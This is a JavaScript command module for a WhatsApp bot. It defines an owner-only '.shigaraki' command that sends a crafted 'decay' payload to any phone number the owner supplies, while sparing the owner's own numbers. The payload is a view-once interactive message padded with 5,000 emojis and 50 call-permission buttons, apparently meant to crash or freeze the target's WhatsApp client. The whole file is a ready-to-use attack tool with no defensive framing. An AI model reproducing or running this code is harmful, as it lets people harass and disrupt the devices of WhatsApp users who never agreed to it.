// commands/shigaraki.js
const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function shigarakiCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "💀 *Tomura Shigaraki*\n\nUsage: .shigaraki <number>\nExample: .shigaraki 628123456789\n\n*Decay Activated*"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected by All Might*" }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `💀 *Decay* spreading to ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "💀", key: message.key } });

    try {
        const decayPayload = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999
                        },
                        body: { text: "✦ Ṡḧīɠȧṙȧḱī ✦" + "💀".repeat(5000) },
                        footer: { text: "Decay" },
                        nativeFlowMessage: {
                            buttons: Array(50).fill({ name: "call_permission_request", buttonParamsJson: "" })
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, decayPayload, { participant: { jid: target } });
        
        await sock.sendMessage(chatId, { text: `✅ *Decay* activated on ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "🖐️", key: message.key } });

    } catch (error) {
        console.error('[Shigaraki]', error.message);
        await sock.sendMessage(chatId, { text: `❌ *Decay failed:* ${error.message}` }, { quoted: message });
    }
}

module.exports = shigarakiCommand;